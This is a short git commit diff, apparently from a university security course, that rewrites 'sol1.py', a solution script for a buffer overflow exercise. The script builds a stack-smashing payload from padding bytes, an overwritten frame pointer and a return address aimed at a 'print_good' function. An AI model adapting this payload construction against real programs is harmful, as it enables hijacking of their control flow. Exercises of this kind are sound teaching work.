62e253e8496f40d96f3207ea2a7b2e90c7e228cc
ryanmars <ryanmars@umich.edu>
2018-03-22 17:35:39 -0400

    Fixed sol1.py

--- targets/sol1.py
+++ targets/sol1.py
@@ -1,5 +1,8 @@
-print_good_addr = "0x0804889c"
-frame_addr = "0xbffefe28"
-good_addr_end = "\x9c\x88\x04\x08"
-frame_addr_end = "\x28\xfe\xfe\xbf"
-print("012345678912"+frame_addr_end+good_addr_end)
+from struct import pack
+
+print_good_addr = 0x0804889c
+frame_addr = 0xbffefe28
+good_addr_end = pack("<I", print_good_addr);
+frame_addr_end = pack("<I", frame_addr);
+
+print("\x00"*12+str(frame_addr_end)+str(good_addr_end))
